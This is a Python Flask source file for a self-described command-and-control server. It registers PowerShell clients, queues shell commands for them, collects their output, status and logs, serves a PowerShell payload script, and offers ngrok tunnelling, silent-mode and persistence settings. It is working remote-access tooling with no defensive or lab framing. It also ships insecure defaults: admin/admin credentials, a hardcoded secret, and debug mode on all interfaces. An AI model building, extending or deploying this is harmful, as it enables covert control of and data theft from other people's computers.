"""
Command and Control (C2) Server API.
This Flask application provides an API for managing PowerShell client connections.
"""
import os
import time
import logging
import datetime
from functools import wraps
from flask import Flask, request, jsonify, render_template, make_response
from storage import Storage

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("c2_server")

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev_secret_key")

# Initialize storage
storage = Storage()

# Admin authentication (basic implementation)
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin")

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            response = make_response("Unauthorized", 401)
            response.headers["WWW-Authenticate"] = 'Basic realm="Login Required"'
            return response
        return f(*args, **kwargs)
    return decorated_function

def timestamp_to_readable(timestamp):
    """Convert Unix timestamp to human-readable format"""
    return datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')

def log_event(message, level="info"):
    """Log events with timestamp to console"""
    timestamp = timestamp_to_readable(time.time())
    formatted_message = f"[{timestamp}] {message}"
    if level == "error":
        logger.error(formatted_message)
    elif level == "warning":
        logger.warning(formatted_message)
    else:
        logger.info(formatted_message)

@app.route('/')
@admin_required
def home():
    """Admin dashboard for the C2 server"""
    return render_template('admin.html')

@app.route('/report/status', methods=['POST'])
def report_status():
    """
    Route for clients to report their status.
    Expected JSON: {'hostname': str, 'username': str, 'ip': str, 'os': str, 'time': int}
    """
    data = request.json or {}
    
    # Verificando se hostname existe (campo obrigatório)
    hostname = data.get('hostname')
    if not hostname:
        return jsonify({"status": "error", "message": "Missing required field: hostname"}), 400
    
    # Obtendo os outros campos com valores padrão se estiverem ausentes
    username = data.get('username', 'unknown')
    ip = data.get('ip', '0.0.0.0')
    os_info = data.get('os', 'unknown')
    timestamp = data.get('time', int(time.time()))
    
    storage.update_host(hostname, username, ip, os_info, timestamp)
    log_event(f"Host {hostname} ({ip}) reported status: {os_info} as {username}")
    
    return jsonify({"status": "success"}), 200

@app.route('/report/logs', methods=['POST'])
def report_logs():
    """
    Route for clients to report logs.
    Expected JSON: {'hostname': str, 'log': any, 'time': int}
    """
    data = request.json or {}
    
    # Verificando se hostname existe (campo obrigatório)
    hostname = data.get('hostname')
    if not hostname:
        return jsonify({"status": "error", "message": "Missing required field: hostname"}), 400
    
    # Obtendo os outros campos com valores padrão se estiverem ausentes
    log_data = data.get('log', 'No log content provided')
    timestamp = data.get('time', int(time.time()))
    
    storage.add_log(hostname, log_data, timestamp)
    log_event(f"Log from {hostname}: {log_data}")
    
    return jsonify({"status": "success"}), 200

@app.route('/error', methods=['POST'])
def report_error():
    """
    Route for clients to report errors.
    Expected JSON: {'hostname': str, 'error': str, 'time': int}
    """
    data = request.json or {}
    
    # Verificando se hostname existe (campo obrigatório)
    hostname = data.get('hostname')
    if not hostname:
        return jsonify({"status": "error", "message": "Missing required field: hostname"}), 400
    
    # Obtendo os outros campos com valores padrão se estiverem ausentes
    error_message = data.get('error', 'No error description provided')
    timestamp = data.get('time', int(time.time()))
    
    storage.add_error(hostname, error_message, timestamp)
    log_event(f"ERROR from {hostname}: {error_message}", level="error")
    
    return jsonify({"status": "success"}), 200

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Route for clients to send heartbeats.
    Expected JSON: {'hostname': str, 'time': int}
    """
    data = request.json or {}
    
    # Verificando se hostname existe (campo obrigatório)
    hostname = data.get('hostname')
    if not hostname:
        return jsonify({"status": "error", "message": "Missing required field: hostname"}), 400
    
    # Obtendo o timestamp com valor padrão se estiver ausente
    timestamp = data.get('time', int(time.time()))
    
    result = storage.update_heartbeat(hostname, timestamp)
    if result:
        log_event(f"Heartbeat from {hostname}")
        return jsonify({"status": "success"}), 200
    else:
        return jsonify({"status": "error", "message": "Host not found"}), 404

@app.route('/command', methods=['GET'])
def get_command():
    """
    Route for clients to get commands.
    Query parameter: hostname
    """
    hostname = request.args.get('hostname')
    if not hostname:
        return jsonify({"status": "error", "message": "Missing hostname parameter"}), 400
    
    command = storage.get_next_command(hostname)
    if command:
        log_event(f"Sending command to {hostname}: {command}")
    
    return command, 200

@app.route('/report/output', methods=['POST'])
def report_output():
    """
    Route for clients to report command output.
    Expected JSON: {'hostname': str, 'command': str, 'output': str, 'time': int}
    """
    data = request.json or {}
    
    # Verificando se hostname existe (campo obrigatório)
    hostname = data.get('hostname')
    if not hostname:
        return jsonify({"status": "error", "message": "Missing required field: hostname"}), 400
    
    # Obtendo os outros campos com valores padrão se estiverem ausentes
    command = data.get('command', 'unknown_command')
    output = data.get('output', 'No output provided')
    timestamp = data.get('time', int(time.time()))
    
    storage.add_command_output(hostname, command, output, timestamp)
    log_event(f"Command output from {hostname} for command '{command}': {output}")
    
    return jsonify({"status": "success"}), 200

@app.route('/config', methods=['GET'])
def get_config():
    """Route to get configuration"""
    config = storage.get_config()
    return jsonify(config), 200

@app.route('/update-config', methods=['POST'])
@admin_required
def update_config():
    """
    Route for admin to update configuration.
    Expected JSON: any of {'ngrok_host': str, 'ngrok_port': int, 'retry_interval': int, 'silent_mode': bool, 'persist': bool}
    """
    data = request.json or {}
    
    # Verifica se há dados de configuração
    if not data:
        return jsonify({"status": "error", "message": "No configuration data provided"}), 400
    
    # Validar tipos dos dados recebidos
    valid_config = {}
    
    # Validar e converter cada campo para o tipo apropriado
    if 'ngrok_host' in data:
        valid_config['ngrok_host'] = str(data['ngrok_host'])
        
    if 'ngrok_port' in data:
        try:
            valid_config['ngrok_port'] = int(data['ngrok_port'])
        except (ValueError, TypeError):
            return jsonify({"status": "error", "message": "ngrok_port must be an integer"}), 400
    
    if 'retry_interval' in data:
        try:
            valid_config['retry_interval'] = int(data['retry_interval'])
        except (ValueError, TypeError):
            return jsonify({"status": "error", "message": "retry_interval must be an integer"}), 400
    
    if 'silent_mode' in data:
        valid_config['silent_mode'] = bool(data['silent_mode'])
    
    if 'persist' in data:
        valid_config['persist'] = bool(data['persist'])
    
    storage.update_config(valid_config)
    log_event(f"Configuration updated: {valid_config}")
    
    return jsonify({"status": "success"}), 200

@app.route('/script', methods=['GET'])
def get_script():
    """Route to get the PowerShell script"""
    script = storage.get_powershell_script()
    return script, 200, {'Content-Type': 'text/plain'}

@app.route('/upload-script', methods=['POST'])
@admin_required
def upload_script():
    """Route for admin to upload a new PowerShell script"""
    script_content = request.data.decode('utf-8')
    if not script_content:
        return jsonify({"status": "error", "message": "No script content provided"}), 400
    
    storage.update_powershell_script(script_content)
    log_event("PowerShell script updated")
    
    return jsonify({"status": "success"}), 200

# Admin API routes for dashboard functionality
@app.route('/api/hosts', methods=['GET'])
@admin_required
def api_get_hosts():
    """API route to get all hosts for admin dashboard"""
    hosts = storage.get_all_hosts()
    return jsonify(hosts), 200

@app.route('/api/logs/<hostname>', methods=['GET'])
@admin_required
def api_get_host_logs(hostname):
    """API route to get logs for a specific host"""
    logs = storage.get_host_logs(hostname)
    return jsonify(logs), 200

@app.route('/api/errors/<hostname>', methods=['GET'])
@admin_required
def api_get_host_errors(hostname):
    """API route to get errors for a specific host"""
    errors = storage.get_host_errors(hostname)
    return jsonify(errors), 200

@app.route('/api/send-command', methods=['POST'])
@admin_required
def api_send_command():
    """API route for admin to send a command to a host"""
    data = request.json
    if not all(k in data for k in ['hostname', 'command']):
        return jsonify({"status": "error", "message": "Missing required fields"}), 400
    
    storage.add_command(data['hostname'], data['command'])
    log_event(f"Command queued for {data['hostname']}: {data['command']}")
    
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    log_event("C2 server starting on port 5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
